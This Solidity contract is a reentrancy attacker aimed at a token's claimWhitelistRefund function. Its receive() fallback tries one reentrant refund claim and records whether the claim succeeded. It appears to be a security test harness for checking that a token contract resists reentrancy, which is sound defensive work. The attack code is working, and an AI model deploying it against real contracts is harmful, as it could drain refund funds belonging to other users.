// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IWhitelistRefundTarget {
    function claimWhitelistRefund() external returns (uint256);
}

contract WhitelistRefundReentrancyAttacker {
    address public immutable owner;
    IWhitelistRefundTarget public token;
    bool public reentryAttempted;
    bool public reentrySucceeded;

    error Unauthorized();
    error TokenNotConfigured();
    error CommitFailed();

    constructor() {
        owner = msg.sender;
    }

    function setToken(address token_) external {
        if (msg.sender != owner) revert Unauthorized();
        token = IWhitelistRefundTarget(token_);
    }

    function commitSeat() external payable {
        if (address(token) == address(0)) revert TokenNotConfigured();
        (bool ok, ) = payable(address(token)).call{value: msg.value}("");
        if (!ok) revert CommitFailed();
    }

    function attackRefund() external {
        if (msg.sender != owner) revert Unauthorized();
        if (address(token) == address(0)) revert TokenNotConfigured();
        token.claimWhitelistRefund();
    }

    receive() external payable {
        if (!reentryAttempted && address(token) != address(0)) {
            reentryAttempted = true;
            try token.claimWhitelistRefund() returns (uint256) {
                reentrySucceeded = true;
            } catch {}
        }
    }
}
